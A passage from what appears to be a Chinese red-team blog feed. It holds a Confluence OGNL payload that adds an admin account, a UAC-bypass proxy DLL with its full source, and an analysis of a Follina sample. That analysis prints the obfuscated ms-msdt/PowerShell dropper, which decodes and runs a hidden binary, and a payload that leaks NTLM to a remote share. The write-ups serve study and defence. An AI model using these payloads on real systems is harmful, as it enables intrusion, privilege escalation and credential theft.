rel="noopener">https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/</a><br>添加用户的payload</p><pre><code>${#this.getUserAccessor().addUser(&#39;test&#39;,&#39;test@1234&#39;,&#39;test@gmail.com&#39;,&#39;Test&#39;,@com.atlassian.confluence.util.GeneralUtil@splitCommaDelimitedString(&quot;confluence-administrators,confluence-users&quot;))}</code></pre><p>设置cookie payload</p><pre><code>${@com.atlassian.confluence.util.GeneralUtil@setCookie(&quot;key&quot;,&quot;value&quot;)}</code></pre><p>EXP<br><a href="https://github.com/Nwqda/CVE-2022-26134" target="_blank" rel="noopener">https://github.com/Nwqda/CVE-2022-26134</a><br><a href="https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL" target="_blank" rel="noopener">https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/vuls/335624.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/335624.html</a><br><a href="https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/" target="_blank" rel="noopener">https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞范围&quot;&gt;&lt;a href=&quot;#漏洞范围&quot; class=&quot;headerlink&quot; title=&quot;漏洞范围&quot;&gt;&lt;/a&gt;漏洞范围&lt;/h2&gt;&lt;p&gt;Confluence Server and Data Center &amp;gt;= 1.3.0&lt;br&gt;Confluence Se</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://jiushill.github.io/tags/代码审计/"/>
    
  </entry>
  
  <entry>
    <title>iscsicpl.exe ByPassUac复现</title>
    <link href="http://jiushill.github.io/posts/c08eee8b.html"/>
    <id>http://jiushill.github.io/posts/c08eee8b.html</id>
    <published>2022-07-15T19:05:19.000Z</published>
    <updated>2022-07-15T21:19:16.698Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上午在推特逛街，看到了个这个bypassuac。复现了一下，写个笔记</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>lnk:<a href="https://www.ddosi.org/iscsicpl-bypassuac/" target="_blank" rel="noopener">https://www.ddosi.org/iscsicpl-bypassuac/</a><br>poc:<a href="https://github.com/hackerhouse-opensource/iscsicpl_bypassUAC/archive/refs/heads/main.zip" target="_blank" rel="noopener">https://github.com/hackerhouse-opensource/iscsicpl_bypassUAC/archive/refs/heads/main.zip</a><br><img src="https://s1.ax1x.com/2022/07/16/j4DSQ1.png" alt=""></p><p>c:\Windows\syswow64\iscsicpl.exe缺少iscsiexe.dll和iscsiexe_org.dll<br><img src="https://s1.ax1x.com/2022/07/16/j4Dpsx.png" alt=""><br><img src="https://s1.ax1x.com/2022/07/16/j4D9L6.png" alt=""></p><p>sigcheck检测,autoElevate为true。进程权限自提升<br><img src="https://s1.ax1x.com/2022/07/16/j4DFoD.png" alt=""></p><p>翻看代码，作者修改了注册表的HKEY_CURRENT_USER\Environment Path的键值为当前用户的TMP目录。看了一下这个注册表的键值和PATH环境变量最后一个路径对应，修改该注册表相当于直接动环境变量路径最后一个路径<br>HKEY_CURRENT_USER\Environment注册表路径参考链接：<a href="https://baike.baidu.com/item/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/1730949" target="_blank" rel="noopener">https://baike.baidu.com/item/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/1730949</a><br>（当然也可以直接修改windir环境变量，然后dll丢到对应目录）<br><img src="https://s1.ax1x.com/2022/07/16/j4DAFe.png" alt=""><br><img src="https://s1.ax1x.com/2022/07/16/j4DeSA.png" alt=""></p><p>重复说一下DLL加载顺序<br><img src="https://s1.ax1x.com/2022/07/16/j4DmQI.png" alt=""><br>直接加载iscsiexe.dl，会报缺少来自iscsiexe_org.dll的SvchostPushServiceGlobals、ServiceMain、DiscpEstablishServiceLinkage外部导出函数。<br><img src="https://s1.ax1x.com/2022/07/16/j4Dnyt.png" alt=""><br>github上poc的dll code<br>(DLL外部函数转发)</p><pre><code>// iscsiexe.cpp, the payload DLL executed by iscsicpl.exe#include &quot;pch.h&quot;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tchar.h&gt;#include &quot;resource.h&quot;#pragma pack(1)// LoadString() for linker#pragma comment(lib,&quot;User32.lib&quot;)#define MAX_ENV_SIZE 32767BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID  lpReserved){    static HINSTANCE hL;    LPWSTR pCMD = new WCHAR[MAX_ENV_SIZE];    char pACMD[MAX_ENV_SIZE];    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:              WinExec(&quot;C:\\Windows\\System32\\cmd.exe&quot;, SW_SHOW);        //hL = LoadLibrary(_T(&quot;.\\iscsiexe_org.dll&quot;));              /*        if (!hL)            return false;        // execute the command string from the module resource section        LoadString(GetModuleHandle(L&quot;iscsiexe.dll&quot;), IDS_CMD101, pCMD,  MAX_ENV_SIZE);        WideCharToMultiByte(CP_ACP, 0, pCMD, wcslen(pCMD), pACMD, MAX_ENV_SIZE,  NULL, NULL);        WinExec(pACMD, SW_SHOW);              */        break;    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        FreeLibrary(hL);        break;    }    return TRUE;}// the proxy DLL mappings for the linker#pragma comment(linker,  &quot;/export:SvchostPushServiceGlobals=iscsiexe_org.SvchostPushServiceGlobals&quot;)#pragma comment(linker, &quot;/export:ServiceMain=iscsiexe_org.ServiceMain&quot;)#pragma comment(linker,  &quot;/export:DiscpEstablishServiceLinkage=iscsiexe_org.DiscpEstablishServiceLinkage&quot;)</code></pre><p>原作者iscsiexe_org.dll生成过程(搞的和他妈自解压马一样，醉了)</p><pre><code>* 利用FindResource函数搜索当前进程搜索DLL资源，寻找102资源获取句柄* LoadResource搜索对应资源获取句柄* SizeofResource检索指定资源的大小* LockResource检索指向内存中指定资源的指针* 然后遍历对应DLL资源，改名为 iscsiexe_org.dll</code></pre><p>VT查杀:<a href="https://www.virustotal.com/gui/file/60004318d9a509e5bad2bda71dd11bcc0304dabe17b30a85366a73ad532aae80" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/60004318d9a509e5bad2bda71dd11bcc0304dabe17b30a85366a73ad532aae80</a><br>稍微搜了一下，dll可能是这里下的：<a href="https://www.dll-files.com/iscsiexe.dll.html" target="_blank" rel="noopener">https://www.dll-files.com/iscsiexe.dll.html</a><br><img src="https://s1.ax1x.com/2022/07/16/j4Df0K.png" alt=""><br><img src="https://s1.ax1x.com/2022/07/16/j4DqXt.png" alt=""><br><img src="https://s1.ax1x.com/2022/07/16/j4DhTO.png" alt=""><br><img src="https://s1.ax1x.com/2022/07/16/j4DIte.png" alt=""><br><img src="https://s1.ax1x.com/2022/07/16/j4D7pd.png" alt=""></p><p><img src="https://s1.ax1x.com/2022/07/16/j4DuOP.png" alt=""></p><p>win7测试<br><img src="https://s1.ax1x.com/2022/07/16/j4DMef.png" alt=""></p><p>win10测试<br><img src="https://s1.ax1x.com/2022/07/16/j4DQw8.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上午在推特逛街，看到了个这个bypassuac。复现了一下，写个笔记&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class</summary>
      
    
    
    
    
    <category term="红队" scheme="http://jiushill.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-30190 样本分析与漏洞复现</title>
    <link href="http://jiushill.github.io/posts/e94de9d7.html"/>
    <id>http://jiushill.github.io/posts/e94de9d7.html</id>
    <published>2022-05-31T17:53:23.000Z</published>
    <updated>2022-05-31T18:16:00.263Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期新爆出的漏洞office的day，利用msdt+远程加载<br>CVE:CVE-2022-30190<br><img src="https://s1.ax1x.com/2022/06/01/XGNEqI.png" alt=""><br>样本地址：<a href="https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/#" target="_blank" rel="noopener">https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/#</a></p><h2 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h2><p>无VBA，远程加载<br><img src="https://s1.ax1x.com/2022/06/01/XGNZZt.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGNedP.png" alt=""></p><p>doc改名zip解压，搜索远程加载的地址定位到word_rels\document.xml.rels<br><img src="https://s1.ax1x.com/2022/06/01/XGNui8.png" alt=""></p><p>通过查看app.any.run沙箱捕获的请求地址内容，查看如下<br><img src="https://s1.ax1x.com/2022/06/01/XGNKJS.png" alt=""></p><p>中间的内容是一段powershell，解码后如下</p><pre><code>&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;body&gt;&lt;script&gt;//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    window.location.href = &quot;ms-msdt:/id PCWDiagnostic /skip force /param \&quot;IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression(&#39;[System.Text.Encoding]&#39;+[char]58+[char]58+&#39;UTF8.GetString([System.Convert]&#39;+[char]58+[char]58+&#39;FromBase64String(&#39;+[char]34+&#39;JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw==&#39;+[char]34+&#39;))&#39;))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\&quot;&quot;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;////////////////////powershell IEX运行$(Invoke-Expression($(Invoke-Expression(&#39;[System.Text.Encoding]&#39;+[char]58+[char]58+&#39;UTF8.GetString([System.Convert]&#39;+[char]58+[char]58+&#39;FromBase64String(&#39;+[char]34+&#39;JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw==&#39;+[char]34+&#39;))&#39;))))///////////////////base64解码内容：$cmd = &quot;c:\windows\system32\cmd.exe&quot;;Start-Process $cmd -windowstyle hidden -ArgumentList &quot;/c taskkill /f /im msdt.exe&quot;; # 隐藏窗口杀死msdt.exeStart-Process $cmd -windowstyle hidden -ArgumentList &quot;/c cd C:\users\public\&amp;&amp;for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&amp;&amp;findstr TVNDRgAAAA 1.rar&gt;1.t&amp;&amp;certutil -decode 1.t 1.c &amp;&amp;expand 1.c -F:* .&amp;&amp;rgb.exe&quot;; # 进入public目录，循环遍历 RAR 文件中的文件，查找编码 CAB文件的 Base64 字符串将此 Base64 编码的 CAB 文件存储为1.t解码Base64编码的CAB文件保存为1.c将1.c CAB文件展开到当前目录，最后：执行rgb.exe（大概压缩在1.c CAB文件里面）</code></pre><p>运行了rgb.exe后会释放几个文件，最后调用csc编译<br>(cs太长了就不贴出来了)<br><img src="https://s1.ax1x.com/2022/06/01/XGNMRg.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGN1Mj.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGN8Ln.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGNUiT.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGNdWF.png" alt=""></p><p>msdt微软官方参数解释如下：<br><img src="https://s1.ax1x.com/2022/06/01/XGNBQJ.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGNDy9.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGNrLR.png" alt=""></p><p>param参数貌似微软没公开怎么调用，只给了架构图<br><img src="https://s1.ax1x.com/2022/06/01/XGNye1.png" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>参考链接：<br><a href="https://huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug" target="_blank" rel="noopener">https://huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug</a><br><a href="https://benjamin-altpeter.de/shell-openexternal-dangers/" target="_blank" rel="noopener">https://benjamin-altpeter.de/shell-openexternal-dangers/</a><br><a href="https://github.com/JohnHammond/msdt-follina" target="_blank" rel="noopener">https://github.com/JohnHammond/msdt-follina</a></p><p>tips:<strong>html注释内容不能少于4096字节</strong><br>将原payload修改为以下可以远程请求获取NTLM</p><pre><code>ms-msdt:-id PCWDiagnostic /moreoptions false /skip true /param IT_BrowseForFile=&quot;\\\\192.168.92.129\\sharp\\calc.exe&quot; /param IT_SelectProgram=&quot;NotListed&quot; /param IT_AutoTroubleshoot=&quot;ts_AUTO&quot;</code></pre><p><img src="https://s1.ax1x.com/2022/06/01/XGN2FK.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGNWWD.png" alt=""></p><p>执行命令和上线<br><img src="https://s1.ax1x.com/2022/06/01/XGNhSe.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGN5yd.png" alt=""></p><p>踩坑：powershell语句太长base64编码执行不成功报错如下<br><img src="https://s1.ax1x.com/2022/06/01/XGNHTP.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;近期新爆出的漏洞office的day，利用msdt+远程加载&lt;br&gt;CVE:CVE-2022-30190&lt;br&gt;&lt;img src=&quot;http</summary>
      
    
    
    
    
    <category term="样本分析" scheme="http://jiushill.github.io/tags/样本分析/"/>
    
  </entry>
  
  <entry>
    <title>syscall学习</title>
    <link href="http://jiushill.github.io/posts/87f73904.html"/>
    <id>http://jiushill.github.io/posts/87f73904.html</id>
    <published>2022-04-08T18:39:56.000Z</published>
    <updated>2022-04-08T18:51:16.610Z</updated>
    
    <content type="html"><![CDATA[<p>好久没写博客了，工作和在学校的自由完全比不了。怀念初中的她怀念大学无拘无束的生活….<br>如今大家都各自毕业，今生能否相见仍成问题<br><img src="https://s1.ax1x.com/2022/04/09/LCzKZ6.jpg" alt=""></p><h2 id="syscall和正常调用的区别"><a href="#syscall和正常调用的区别" class="headerlink" title="syscall和正常调用的区别"></a>syscall和正常调用的区别</h2><p>正常使用WIN API:ntdll-&gt;kernelBase.dll-&gt;kerlnel32.dll<br>SYSCALL:内核函数直接调用 (不会通过Loadlibrary+GetprocAddress调用下一级DLL的API函数，直接进行调用)</p><p>下图可以更好的理解<br>正常API调用过程如下<br>（可以看到调用VirtualAlloc的流程是，Kernel32.dll!VirtualAlloc-&gt;KernelBase.dll!VirtualAllocEx-&gt;Ntdll!NtAllocateVirtualMemory）<br><img src="https://s1.ax1x.com/2022/04/09/LCzQIO.png" alt=""></p><p>SYSCALL调用则不会有下级DLL加载调用API函数<br><img src="https://s1.ax1x.com/2022/04/09/LCz3Je.png" alt=""></p><h2 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h2><p>这次主要将VirtualAlloc改成Syscall<br>（下图直接编译运行则和图一一样，调用下层DLL进行调用）<br>源代码：</p><pre><code class="C">#include &lt;stdio.h&gt;#include &lt;windows.h&gt;int main(){    unsigned char buf[] =            